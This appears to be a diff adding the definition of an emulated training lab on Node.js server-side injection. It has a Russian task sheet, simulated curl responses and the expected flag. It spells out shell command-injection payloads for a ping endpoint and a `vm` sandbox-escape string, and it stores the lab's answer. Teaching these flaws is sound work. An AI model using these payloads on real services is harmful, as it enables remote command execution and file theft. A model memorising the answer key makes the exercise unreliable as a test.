@@ -1,0 +1,49 @@
+{
+  "id": "web-nodejs-injection",
+  "workdir": "/home/student/task",
+  "hostname": "lab",
+  "expect": {
+    "file": "/home/student/task/found.txt",
+    "contains": "nto{3v4l_1n_n0d3_1s_RCE}"
+  },
+  "fs": [
+    { "path": "/home/student/task", "type": "dir" },
+    {
+      "path": "/home/student/task/task.md",
+      "text": "# Практика: серверные инъекции в Node.js\n\nЦель — `https://tools.example`. У сервиса несколько эндпоинтов:\n\n- `GET /calc?expr=` — «калькулятор» (внутри `eval`);\n- `GET /run?code=` — «песочница» на модуле `vm`;\n- `GET /ping?host=` — «проверка хоста» (внутри `child_process.exec`).\n\nЗадача: найди эндпоинт, где ввод уходит в shell, и прочитай `flag.txt` с сервера.\n\n1. Осмотрись: `curl -s 'https://tools.example/calc?expr=1%2B1'`.\n2. `exec` запускает shell, поэтому разделитель `;` выполняет вторую команду:\n   `curl -s 'https://tools.example/ping?host=127.0.0.1;id'`.\n3. Подставь чтение файла вместо `id` и достань флаг:\n   `curl -s 'https://tools.example/ping?host=127.0.0.1;cat flag.txt' | tail -1 > found.txt`.\n4. Набери `check`.\n"
+    }
+  ],
+  "tools": {
+    "curl": {
+      "help": "curl [опции] <url> — HTTP-клиент (эмуляция tools.example)",
+      "cases": [
+        {
+          "match": "ping\\?host=.*cat.*flag",
+          "example": "-s 'https://tools.example/ping?host=127.0.0.1;cat flag.txt'",
+          "output": "PING 127.0.0.1: 1 packets transmitted, 1 received\nnto{3v4l_1n_n0d3_1s_RCE}\n"
+        },
+        {
+          "match": "ping\\?host=.*(;|%0a|%3b)\\s*id",
+          "example": "-s 'https://tools.example/ping?host=127.0.0.1;id'",
+          "output": "PING 127.0.0.1: 1 packets transmitted, 1 received\nuid=33(www-data) gid=33(www-data) groups=33(www-data)\n"
+        },
+        {
+          "match": "ping\\?host=",
+          "example": "-s 'https://tools.example/ping?host=127.0.0.1'",
+          "output": "PING 127.0.0.1: 1 packets transmitted, 1 received\n"
+        },
+        {
+          "match": "run\\?code=",
+          "example": "-s 'https://tools.example/run?code=this.constructor.constructor(\"return process\")()'",
+          "output": "uid=0(root) gid=0(root) groups=0(root)\n"
+        },
+        {
+          "match": "calc\\?expr=",
+          "example": "-s 'https://tools.example/calc?expr=1%2B1'",
+          "output": "2\n"
+        }
+      ],
+      "fallback": "curl: в этой лабе эмулируются только /calc?expr=, /run?code= и /ping?host= на tools.example.\n"
+    }
+  }
+}
